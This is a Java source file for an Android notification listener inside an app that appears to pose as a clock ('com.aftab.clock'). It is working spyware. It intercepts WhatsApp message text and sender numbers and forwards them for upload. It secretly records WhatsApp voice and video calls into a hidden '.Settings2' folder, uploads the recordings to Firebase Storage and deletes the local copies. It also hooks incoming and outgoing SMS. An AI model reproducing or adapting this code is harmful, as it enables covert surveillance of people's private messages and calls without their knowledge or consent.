package com.aftab.clock.Services;

import android.annotation.SuppressLint;
import android.app.Notification;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import com.aftab.clock.Model.WhatsappCallLogs;
import com.aftab.clock.Receivers.SMSReceiver;
import com.aftab.clock.Receivers.SmsObserver;
import com.aftab.clock.Utills.Constants;
import com.aftab.clock.Utills.Functions;
import com.aftab.clock.Utills.SharedPref;
import com.google.android.gms.tasks.Task;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;

import java.io.File;
import java.io.IOException;

@SuppressWarnings("deprecation")
public class NotificationListener extends NotificationListenerService {

    private static final String TAG = "NotificationListener";
    private static final String WA_PACKAGE = "com.whatsapp";
    private static String callingNumber, lastState, from;
    private static boolean isRecording = false, wasCall = false, wasVCall = false;
    SMSReceiver smsReceiver;
    Context context;
    MediaRecorder recorder;
    SharedPref sh;
    StorageReference audioFileRef;

    @Override
    public void onListenerConnected() {
        Log.i(TAG, "Notification Listener connected");
    }

    @SuppressLint("ResourceType")
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {

        /*if ((sbn.getNotification().flags & Notification.FLAG_GROUP_SUMMARY) != 0) {
            //Ignore the notification
            return;
        }*/

        context = this;
        sh = new SharedPref(context);


        if (sbn.getPackageName().equals(WA_PACKAGE)) {

            //  Log.d("FJJJFJF", "in ");

            Notification notification = sbn.getNotification();
            Bundle bundle = notification.extras;

            from = bundle.getString(NotificationCompat.EXTRA_TITLE);
            String message = bundle.getString(NotificationCompat.EXTRA_TEXT);
            String number = "";

            Log.d("FJJJFJF", "jjj " + message + "===" + from);


            if (message != null) {

                if (message.equals("Incoming voice call")) {

                    wasCall = true;
                    wasVCall = false;

                    lastState = Constants.W_AUIDO_MISSED;
                    callingNumber = Functions.getPhoneNumber(context, from);
                    Log.d("FJJJFJF", lastState + "===" + wasCall + "===" + callingNumber);
                    sh.putString(Constants.ID, sbn.getPostTime() + "");

                } else if (message.equals("Calling…")) {

                    if (notification.getSmallIcon().getResId() == 2131231571) {

                        wasCall = true;
                        wasVCall = false;
                        lastState = Constants.W_AUIDO_MISSED;

                    } else if (notification.getSmallIcon().getResId() == 2131232031) {

                        wasCall = false;
                        wasVCall = true;
                        lastState = Constants.W_VIDEO_MISSED;
                    }

                    callingNumber = Functions.getPhoneNumber(context, from);
                    Log.d("FJJJFJF", lastState + "===" + wasCall + "===" + callingNumber);
                    sh.putString(Constants.ID, sbn.getPostTime() + "");

                } else if (message.equals("Ringing…")) {

                    if (notification.getSmallIcon().getResId() == 2131231571) {

                        wasCall = true;
                        wasVCall = false;
                        lastState = Constants.W_AUIDO_MISSED;

                    } else if (notification.getSmallIcon().getResId() == 2131232031) {

                        wasCall = false;
                        wasVCall = true;
                        lastState = Constants.W_VIDEO_MISSED;
                    }

                    callingNumber = Functions.getPhoneNumber(context, from);
                    Log.d("FJJJFJF", lastState + "===" + wasCall + "===" + callingNumber);
                    sh.putString(Constants.ID, sbn.getPostTime() + "");

                } else if (message.equals("Ongoing voice call")) {

                    wasCall = true;
                    wasVCall = false;

                    sh.putString(Constants.ID, sbn.getPostTime() + "");
                    callingNumber = Functions.getPhoneNumber(context, from);
                    if (!isRecording && recorder == null) {

                        startRecording(context, Constants.WHATSAPP_A_CALL_LOG);

                    }


                } else if (message.equals("Ongoing video call")) {

                    wasCall = false;
                    wasVCall = true;

                    sh.putString(Constants.ID, sbn.getPostTime() + "");
                    callingNumber = Functions.getPhoneNumber(context, from);
                    if (!isRecording && recorder == null) {

                        startRecording(context, Constants.WHATSAPP_V_CALL_LOG);

                    }


                } else if (Functions.whatsappMessageRegix(message) && !from.equalsIgnoreCase("WhatsApp Web") && notification.category != null && notification.category.equals("msg")) {

                    wasVCall = false;
                    wasCall = false;

                    // Toast.makeText(context, "" + message, Toast.LENGTH_SHORT).show();

                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {


                        String n = notification.getShortcutId();

                        if (n != null) {

                            number = n.replace("@s.whatsapp.net", "");
                            number = "+" + number;

                        }

                    }

                    Log.i(TAG, "From: " + from);
                    Log.i(TAG, "Message: " + message);

                    String date = Functions.getCurrentDate();

                    date = Functions.getMilliSeconds(date);


                    Intent intent1 = new Intent(context, UploadNewWhatsAppMessage.class);
                    intent1.putExtra(Constants.SIM_SMS, message);
                    intent1.putExtra(Constants.NUMBER, number);
                    intent1.putExtra(Constants.DATE, date);
                    intent1.putExtra(Constants.TYPE, Constants.RECEIVED_WhATSAPP_MESSAGE);


                    context.startService(intent1);

                } else if (message.contains(" Incoming video call")) {

                    wasCall = false;
                    wasVCall = true;

                    lastState = Constants.W_VIDEO_INCOMING;
                    callingNumber = Functions.getPhoneNumber(context, from);
                    Log.d("FJJJFJF", lastState + "===" + wasCall + "===" + callingNumber);
                    sh.putString(Constants.ID, sbn.getPostTime() + "");

                    Log.d("FJJJFJF", "jjj " + message + "==223=");

                    /*callingNumber = Functions.getPhoneNumber(context, from);
                    String date = System.currentTimeMillis() + "";
                    String id = date + callingNumber;
                    lastState = "W_MISSED";

                    WhatsappCallLogs whatsappCallLogs = new WhatsappCallLogs(id, from, callingNumber, lastState, date, "0", "No Location", "no", false);

                    context.startService(new Intent(context, UploadNewWCallLog.class).putExtra(Constants.WHATSAPP_CALL_LOG, whatsappCallLogs));
*/
                }


            } /*else {

                wasCall = false;

            }*/
        }

        ContentResolver contentResolver = context.getContentResolver();
        contentResolver.registerContentObserver(Uri.parse("content://sms/out"), true, new SmsObserver(new Handler(), context));

   /*     if ((sbn.getNotification().flags & Notification.FLAG_GROUP_SUMMARY) != 0) {
            //Ignore the notification
            return;
        }

        Long lastWhen = pkgLastNotificationWhen.get(sbn.getPackageName());
        if (lastWhen != null && lastWhen >= sbn.getNotification().when) {
            Log.d(TAG, "Ignore Old notification");
            return;
        }

        pkgLastNotificationWhen.put(sbn.getPackageName(), sbn.getNotification().when);*/


        IntentFilter filter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
        this.registerReceiver(smsReceiver, filter);


    }


    private void startRecording(Context context, String callLogType) {


        //  Toast.makeText(context, "Rec", Toast.LENGTH_SHORT).show();

        File sampleDir = new File(Environment.getExternalStorageDirectory(), "/.Settings2");
        if (!sampleDir.exists()) {
            sampleDir.mkdirs();
        }

        File audiofile = null;

        try {
            audiofile = File.createTempFile(System.currentTimeMillis() + "", ".mp3", sampleDir);

        } catch (IOException e) {
            e.printStackTrace();
            //Toast.makeText(context, "" + e.getMessage(), Toast.LENGTH_SHORT).show();
        }


        recorder = new MediaRecorder();

        if (callLogType.equals(Constants.WHATSAPP_A_CALL_LOG)) {

            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) {
                recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                //  callType = "MIC";
            } else {
                recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_RECOGNITION);
                // callType = "VOICE_COMMUNICATION";
            }
        } else if (callLogType.equals(Constants.WHATSAPP_V_CALL_LOG)) {

            /*if (lastState.equals(Constants.W_VIDEO_INCOMING)) {

                recorder.setAudioSource(MediaRecorder.AudioSource.MIC);

            } else {

                recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_RECOGNITION);

            }
*/

            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) {
                recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                //  callType = "MIC";
            } else {
                recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_RECOGNITION);
                // callType = "VOICE_COMMUNICATION";
            }

        }

        recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
        assert audiofile != null;


        recorder.setOutputFile(audiofile.getAbsolutePath());

        sh.putString(Constants.LAST_REC_W_URI, audiofile.toString());

        try {

            recorder.prepare();

        } catch (IllegalStateException | IOException e) {
            e.printStackTrace();
            //Toast.makeText(context, "" + e.getMessage(), Toast.LENGTH_SHORT).show();
        }


        isRecording = true;
        recorder.start();


    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        super.onNotificationRemoved(sbn);

        context = this;
        sh = new SharedPref(context);

        String keyId = sh.getString(Constants.ID);


        Log.d("FJJJFJF", keyId + "=======" + sbn.getPostTime());

        if (sbn.getPackageName().equals(WA_PACKAGE) && !keyId.equals("") && keyId.equals(sbn.getPostTime() + "")) {

            String date = sbn.getPostTime() + "";
            String id = date + callingNumber;

            WhatsappCallLogs whatsappCallLogs = new WhatsappCallLogs(id, from, callingNumber, lastState, date, "0", "No Location", "no", false);

            Log.d("FJJJFJF", id + "===" + from + "===" + callingNumber + "===" + lastState + "===" + date + "===" + wasCall);


            if (wasCall && !wasVCall) {


                if (isRecording && recorder != null) {
                    isRecording = false;
                    //  Toast.makeText(context, "Stop", Toast.LENGTH_SHORT).show();
                    recorder.stop();
                    recorder = null;

                    String dur = Functions.getAudioDuration(context, sh.getString(Constants.LAST_REC_W_URI));

                    whatsappCallLogs.setCallDuration(dur);

                    if (!dur.equals("0")) {

                        whatsappCallLogs.setCallType(Constants.W_A_INCOMING);


                        audioFileRef = FirebaseStorage.getInstance().getReference().child("Audio Files");

                        String fileUri = sh.getString(Constants.LAST_REC_W_URI);


                        Uri file = Uri.fromFile(new File(fileUri));

                        StorageReference filePath = audioFileRef.child(file.getLastPathSegment());


                        filePath.putFile(file).addOnSuccessListener(taskSnapshot -> {

                            final Task<Uri> firebaseUri = taskSnapshot.getStorage().getDownloadUrl();

                            firebaseUri.addOnSuccessListener(uri -> {

                                String link = uri.toString();
                                whatsappCallLogs.setUrl(link);

                                sh.putString(Constants.ID, "");



                                whatsappCallLogs.setCallType(Constants.W_A_INCOMING);
                                context.startService(new Intent(context, UploadNewWACallLog.class).putExtra(Constants.WHATSAPP_A_CALL_LOG, whatsappCallLogs));

                                File file1 = new File(String.valueOf(file));

                                file1.delete();

                            });

                        });

                    } else {

                        whatsappCallLogs.setCallType(Constants.W_AUIDO_MISSED);
                        sh.putString(Constants.ID, "");
                        context.startService(new Intent(context, UploadNewWACallLog.class).putExtra(Constants.WHATSAPP_A_CALL_LOG, whatsappCallLogs));
                        // sh.putString(Constants.ID, sbn.getId() + "");

                    }

                } else {

                    sh.putString(Constants.ID, "");
                    whatsappCallLogs.setCallType(Constants.W_AUIDO_MISSED);
                    //missed or rejected
                    context.startService(new Intent(context, UploadNewWACallLog.class).putExtra(Constants.WHATSAPP_A_CALL_LOG, whatsappCallLogs));
                    //  sh.putString(Constants.ID, sbn.getId() + "");

                }

            } else if (!wasCall && callingNumber != null && !wasVCall) {

                sh.putString(Constants.ID, "");
                whatsappCallLogs.setCallType(Constants.W_AUIDO_MISSED);
                //missed or rejected
                context.startService(new Intent(context, UploadNewWACallLog.class).putExtra(Constants.WHATSAPP_A_CALL_LOG, whatsappCallLogs));


            } else if (wasVCall && !wasCall) {

                if (isRecording && recorder != null) {
                    isRecording = false;
                    ///  Toast.makeText(context, "Stop", Toast.LENGTH_SHORT).show();
                    recorder.stop();
                    recorder = null;

                    String dur = Functions.getAudioDuration(context, sh.getString(Constants.LAST_REC_W_URI));

                    whatsappCallLogs.setCallDuration(dur);

                    if (!dur.equals("0")) {


                        audioFileRef = FirebaseStorage.getInstance().getReference().child("Audio Files");

                        StorageReference filePath = audioFileRef.child(id + ".amr");

                        String fileUri = sh.getString(Constants.LAST_REC_W_URI);

                        File file = new File(fileUri);

                        filePath.putFile(Uri.fromFile(file)).addOnSuccessListener(taskSnapshot -> {

                            final Task<Uri> firebaseUri = taskSnapshot.getStorage().getDownloadUrl();

                            firebaseUri.addOnSuccessListener(uri -> {


                                String link = uri.toString();

                                whatsappCallLogs.setUrl(link);

                                sh.putString(Constants.ID, "");
                                //  whatsappCallLogs.setCallType(Constants.W_VIDEO_INCOMING);
                                context.startService(new Intent(context, UploadNewWVCallLog.class).putExtra(Constants.WHATSAPP_V_CALL_LOG, whatsappCallLogs));

                                file.delete();

                            });

                        });

                    } else {

                        sh.putString(Constants.ID, "");
                        context.startService(new Intent(context, UploadNewWVCallLog.class).putExtra(Constants.WHATSAPP_V_CALL_LOG, whatsappCallLogs));
                        // sh.putString(Constants.ID, sbn.getId() + "");

                    }

                } else {

                    sh.putString(Constants.ID, "");
                    whatsappCallLogs.setCallType(Constants.W_VIDEO_MISSED);
                    Log.d("FJJJFJF", "JJJJD" + whatsappCallLogs.getCallType());
                    //missed or rejected
                    context.startService(new Intent(context, UploadNewWVCallLog.class).putExtra(Constants.WHATSAPP_V_CALL_LOG, whatsappCallLogs));
                    //  sh.putString(Constants.ID, sbn.getId() + "");

                }

            }


        } else {

            sh.putString(Constants.ID, "");

        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return super.onBind(intent);
    }
/*
    private void uploadCallLog(Context context) {


        if (!callingNumber.contains("*") && !callingNumber.contains("#")) {

            if (!callingNumber.startsWith("+") && callingNumber.length() > 6) {

                callingNumber = Functions.formatNumber(context, callingNumber, Functions.checkCountryISO(context));


            }

        }


        String pushId = System.currentTimeMillis() + callingNumber + "";


        if ((!callDuration.equals("0")) && (dir.equals("OUTGOING") || dir.equals("INCOMING"))) {


            StorageReference filePath = audioFileRef.child(pushId + ".amr");

            String fileUri = sh.getString(Constants.LAST_REC_URI);

            File file = new File(fileUri);

            filePath.putFile(Uri.fromFile(file)).addOnSuccessListener(taskSnapshot -> {

                final Task<Uri> firebaseUri = taskSnapshot.getStorage().getDownloadUrl();

                firebaseUri.addOnSuccessListener(uri -> {

                    String callType2 = "";

                    if (dir.equals("OUTGOING")) {

                        callType2 = "OUTGOING_REC";

                    } else if (dir.equals("INCOMING")) {

                        callType2 = "INCOMING_REC";

                    }

                    String link = uri.toString();

                    callLogs = new CallLogs(pushId, nameS, callingNumber, callType2, callDate, callDuration, "No Location", link, false);

                    context.startService(new Intent(context, UploadNewCallLog.class).putExtra(Constants.CALL_LOGS, callLogs));

                    file.delete();

                });

            });


        } else {


            callLogs = new CallLogs(pushId, nameS, callingNumber, dir, callDate, callDuration, "No Location", "no", false);
            context.startService(new Intent(context, UploadNewCallLog.class).putExtra(Constants.CALL_LOGS, callLogs));


        }
    }*/


}